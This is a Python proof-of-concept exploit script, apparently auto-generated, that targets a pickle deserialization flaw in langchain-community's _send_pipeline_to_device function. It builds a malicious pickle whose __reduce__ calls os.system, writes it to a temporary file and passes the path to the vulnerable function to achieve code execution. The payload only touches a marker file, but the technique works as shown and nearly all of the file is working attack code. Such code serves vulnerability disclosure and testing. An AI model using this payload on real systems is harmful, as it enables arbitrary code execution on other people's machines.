#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: The function _send_pipeline_to_device in self_hosted.py
accepts a 'pipeline' parameter. If it's a string, it opens the file and
deserializes it with pickle.load(). An attacker controlling this parameter
can provide a path to a malicious pickle file, leading to arbitrary code
execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command
2. Simulates an attacker controlling the 'pipeline' parameter
3. Triggers the vulnerable function with the path to the malicious pickle
"""

import pickle
import os
import sys
import tempfile
import subprocess

# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = 8000
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Benign payload: create a marker file to prove code execution
MARKER_FILE = "/tmp/poc_success.txt"
BENIGN_COMMAND = f"touch {MARKER_FILE}"


class MaliciousPickle:
    """Class that executes a command when unpickled."""
    def __reduce__(self):
        return (os.system, (BENIGN_COMMAND,))


def create_malicious_pickle():
    """Create a malicious pickle file with benign payload."""
    payload = MaliciousPickle()
    
    # Create temporary file
    fd, path = tempfile.mkstemp(suffix='.pkl')
    os.close(fd)
    
    # Write malicious pickle
    with open(path, 'wb') as f:
        pickle.dump(payload, f)
    
    print(f"[+] Created malicious pickle at: {path}")
    print(f"[+] Payload will execute: {BENIGN_COMMAND}")
    return path


def simulate_exploit(pickle_path):
    """
    Simulate the exploit by directly calling the vulnerable function
    with the path to our malicious pickle file.
    
    In a real attack scenario, this would be triggered via a web endpoint
    that passes user input to _send_pipeline_to_device.
    """
    # Import the vulnerable module
    sys.path.insert(0, '/tmp/langchain-community-only')
    
    try:
        from langchain_community.llms.self_hosted import _send_pipeline_to_device
        
        print(f"[+] Calling _send_pipeline_to_device with pipeline='{pickle_path}'")
        print("[+] This will trigger pickle.load() on our malicious file...")
        
        # Trigger the vulnerability
        result = _send_pipeline_to_device(pickle_path, device=-1)
        
        print(f"[+] Function returned: {result}")
        
        # Check if our payload executed
        if os.path.exists(MARKER_FILE):
            print(f"[+] SUCCESS! Marker file created at {MARKER_FILE}")
            print("[+] Code execution confirmed!")
            # Clean up marker
            os.remove(MARKER_FILE)
        else:
            print("[-] Marker file not found - payload may not have executed")
            
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        sys.exit(1)
    finally:
        # Clean up pickle file
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
            print(f"[+] Cleaned up pickle file: {pickle_path}")


def main():
    """Main exploit function."""
    print("=" * 60)
    print("LangChain-Community RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Step 1: Create malicious pickle
    print("[*] Step 1: Creating malicious pickle file...")
    pickle_path = create_malicious_pickle()
    print()
    
    # Step 2: Simulate the exploit
    print("[*] Step 2: Simulating exploit...")
    simulate_exploit(pickle_path)
    print()
    
    print("[*] Exploit completed.")


if __name__ == "__main__":
    main()
